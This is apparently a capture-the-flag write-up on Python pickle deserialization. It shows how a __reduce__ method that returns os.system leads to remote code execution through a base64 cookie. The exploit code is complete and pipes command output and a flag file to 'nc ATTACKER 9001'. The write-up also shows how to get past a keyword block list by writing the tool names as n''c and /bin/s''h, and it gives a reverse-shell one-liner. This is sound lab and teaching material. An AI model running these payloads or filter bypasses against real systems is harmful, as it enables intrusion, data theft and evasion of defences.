# Python Pickle RCE via __reduce__

## Overview

When `pickle.loads()` deserializes an object, if the class defines `__reduce__()`, Python calls it to reconstruct the object. `__reduce__` returns a `(callable, args)` tuple — Python calls `callable(*args)`. Setting `callable = os.system` gives arbitrary command execution.

## The Primitive

```python
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return os.system, ("id | nc ATTACKER PORT",)

print(base64.b64encode(pickle.dumps(RCE())).decode())
```

No module path issue here — `os.system` is a built-in, always resolvable.

## Badword Filter Bypass

The HTBooks filter blocks: `nc`, `ncat`, `/bash`, `/sh`, `subprocess`, `Popen`

Shell ignores empty single-quoted strings inside words, so `n''c` executes as `nc`:

```python
return os.system, ("cat flag.txt | n''c ATTACKER 9001",)
# /bin/sh bypass:  /bin/s''h
# /bin/bash:       /bin/bas''h
```

The filter checks the raw pickle bytes for these strings — inserting `''` breaks the match.

## Full Exploit

```python
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return os.system, ("cat flag.txt | n''c ATTACKER 9001",)

print(base64.b64encode(pickle.dumps(RCE())).decode())
```

Submit the base64 as the `auth_8bH3mjF6n9` cookie. The server returns 500 (no valid Session object returned) but the command executes before the error.

## Key Notes

- `__reduce__` fires on any `pickle.loads()` call — no magic method vulnerability needed in the application code
- The `os.system` callable is stored as `posix.system` in the pickle bytes (same thing)
- curl exits 28 (timeout) because `os.system` blocks until the `nc` subprocess finishes — the flag is already captured
- For reverse shells: use `n''c -e /bin/s''h ATTACKER PORT` or pipe through `bash -c` with encoding
